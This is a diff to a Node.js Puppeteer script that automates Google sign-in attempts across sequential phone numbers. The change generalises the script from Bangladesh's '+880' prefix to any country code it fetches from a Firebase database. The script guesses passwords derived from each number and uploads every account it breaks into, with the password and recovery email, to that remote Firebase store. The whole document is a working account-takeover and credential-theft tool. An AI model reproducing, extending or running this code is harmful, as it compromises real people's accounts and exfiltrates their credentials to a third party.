@@ -3,7 +3,7 @@ const request = require('request')
 const fs = require('fs')
 
 let SERVER = ''
-let SIRIAL = ''
+let CODE = ''
 let SIZE = 0
 let database = null
 
@@ -27,14 +27,12 @@ let mRecovery = null
 let page = null
 let browser = null
 
-let raiyan = ''
 let signin = ''
         
 
 module.exports = class {
     constructor (db, server, sirial, size) {
         SERVER = server
-        SIRIAL = sirial
         SIZE = size
         database = db
 
@@ -51,7 +49,6 @@ module.exports = class {
         page = null
         browser = null
 
-        raiyan = 'https://raiyan-088-default-rtdb.firebaseio.com/raiyan/number/'
         signin = 'https://accounts.google.com/signin/v2/identifier?service=accountsettings&hl=en-US&continue=https://myaccount.google.com/phone&csig=AF-SEnY7bxxtADWhtFc_:1556625798&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
         
         update = parseInt(new Date().getTime() / 1000)
@@ -79,36 +76,23 @@ module.exports = class {
         console.log('Downloading data...')
         
         request({
-            url: raiyan+'sirial.json',
+            url: 'https://raiyan-088-default-rtdb.firebaseio.com/raiyan/code/server/'+SERVER+'.json',
             json:true
         }, function(error, response, body){
             if(!error) {
-                mSirial = parseInt(body[SIRIAL])
-                request({
-                    url: raiyan+'server/'+SERVER+'.json',
-                    json:true
-                }, function(error, response, body){
-                    if(!error) {
-                        if(body['start_'+SIZE] == null) {
-                            mNumber = parseInt(SIRIAL+mSirial+'000000')
-                            database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
-                            database.set('/number/server/'+SERVER+'/start_'+SIZE, parseInt(SIRIAL+mSirial))
-                            database.set('/number/sirial/'+SIRIAL, mSirial+1)
-                        } else {
-                            mSirial = parseInt(body['start_'+SIZE])
-                            mNumber = parseInt(body['runing_'+SIZE])
-                        }
-                        
-                        if(mNumber == 0) {
-                            console.log('Stop Service')
-                            clearInterval(timer)
-                        } else {
-                            console.log('+880'+mNumber)
-                            console.log('Download Success')
-                            startService()
-                        }
-                    }
-                })
+                mSirial = parseInt(body['start_'+SIZE])
+                mNumber = parseInt(body['runing_'+SIZE])
+
+                CODE = body['code']
+                
+                if(mNumber == 0) {
+                    console.log('Stop Service')
+                    clearInterval(timer)
+                } else {
+                    console.log(CODE+mNumber)
+                    console.log('Download Success')
+                    startService()
+                }
             }
         })
     }
@@ -178,17 +162,17 @@ async function requestUpdate() {
                         root.value = number
                         return true 
                     }
-                }, '+880'+mNumber)
+                }, CODE+mNumber)
 
                 if(check) {
                     mNumber++
                     mLoad++
                     if(parseInt(mSirial)+1 <= parseInt(mNumber/1000000)) {
-                        database.set('/number/server/'+SERVER+'/runing_'+SIZE, 0)
+                        database.set('/code/server/'+SERVER+'/runing_'+SIZE, 0)
                     } else {
                         if(mLoad % 10 == 0) {
                             console.log('ID:' +SIZE+' --- '+mLoad+' --- Null')
-                            database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
+                            database.set('/code/server/'+SERVER+'/runing_'+SIZE, mNumber)
                         }
                         check = await click('#identifierNext')
                         if(check) {
@@ -214,14 +198,14 @@ async function requestUpdate() {
                         root.value = number
                         return true 
                     }
-                }, '+880'+mNumber)
+                }, CODE+mNumber)
 
                 if(check) {
                     mNumber++
                     mLoad++
                     if(mLoad % 10 == 0) {
                         console.log('ID:' +SIZE+' --- '+mLoad+' --- Null')
-                        database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
+                        database.set('/code/server/'+SERVER+'/runing_'+SIZE, mNumber)
                     }
                     await click('#identifierNext')
                 }
@@ -232,7 +216,7 @@ async function requestUpdate() {
                     mAUth = null
                     mProcess = 0
                     mPasswordTry = 0
-                    database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
+                    database.set('/code/server/'+SERVER+'/runing_'+SIZE, mNumber)
                     page.goto(signin)
                 } else {
                     check = await exits('#passwordNext')
@@ -274,7 +258,7 @@ async function requestUpdate() {
                         mAUth = null
                         mProcess = 0
                         mPasswordTry = 0
-                        database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
+                        database.set('/code/server/'+SERVER+'/runing_'+SIZE, mNumber)
                         await click('div.YZrg6.HnRr5d.iiFyne.cd29Sd')
                     } else {
                         mProcess = 4
@@ -342,16 +326,16 @@ async function requestUpdate() {
                 if(header != 0) {
                     let now = parseInt(new Date().getTime() / 1000)
                     if(header == 1 && parseInt(now-mChangeTime) > 10) {
-                        database.set('/number/password/'+(mNumber-1), mPasswordTry)
+                        database.set('/code/'+CODE.replace('+', '')+'/password/'+(mNumber-1), mPasswordTry)
                         page.goBack()
                         mAUth = null
                         mProcess = 0
                         mPasswordTry = 0
                     } else {
                         if(header == 6) {
-                            database.set('/number/menually/'+(mNumber-1), mPasswordTry)
+                            database.set('/code/'+CODE.replace('+', '')+'/menually/'+(mNumber-1), mPasswordTry)
                         } else {
-                            database.set('/number/reject/'+(mNumber-1), mPasswordTry)
+                            database.set('/code/'+CODE.replace('+', '')+'/reject/'+(mNumber-1), mPasswordTry)
                         }
                         page.goBack()
                         mAUth = null
@@ -663,7 +647,7 @@ async function requestUpdate() {
 
                     mGmail = gmail.replace('@gmail.com', '').replace('.', '')
                     let now = parseInt(new Date().getTime() / 1000)
-                    database.update('/number/completed/'+mGmail, { active : now, password : mPassword, number : (mNumber-1), recovery : mRecoveryMail, create : mCreated})
+                    database.update('/code/'+CODE.replace('+', '')+'/completed/'+mGmail, { active : now, password : mPassword, number : (mNumber-1), recovery : mRecoveryMail, create : mCreated})
                     
                     mProcess = 19
                 } else {
@@ -796,21 +780,23 @@ async function requestUpdate() {
 async function checkPassword() {
     if(mPasswordTry >= 3) {
         if(parseInt(mSirial)+1 <= parseInt(mNumber/1000000)) {
-            database.set('/number/server/'+SERVER+'/runing_'+SIZE, 0)
+            database.set('/code/server/'+SERVER+'/runing_'+SIZE, 0)
         } else {
-            database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
+            database.set('/code/server/'+SERVER+'/runing_'+SIZE, mNumber)
         }
         return true
     } else {
+        let temp = ''+(mNumber-1)
+        if(CODE == '+880') {
+            temp = '0'+(mNumber-1)
+        }
         if(mPasswordTry == 0) {
-            mPassword = '0'+(mNumber-1)
+            mPassword = temp
             console.log('ID:' +SIZE+' --- '+mLoad+' --- +88'+mPassword)
         } else if(mPasswordTry == 1) {
-            let temp = '0'+(mNumber-1)
             mPassword = temp.substring(0, 8)
         } else if(mPasswordTry == 2) {
-            let temp = '0'+(mNumber-1)
-            mPassword = temp.substring(3, 11)
+            mPassword = temp.substring(temp.length-8, temp.length)
         }
 
         await page.evaluate((pass) => document.querySelector('input[type="password"]').value = pass , mPassword)
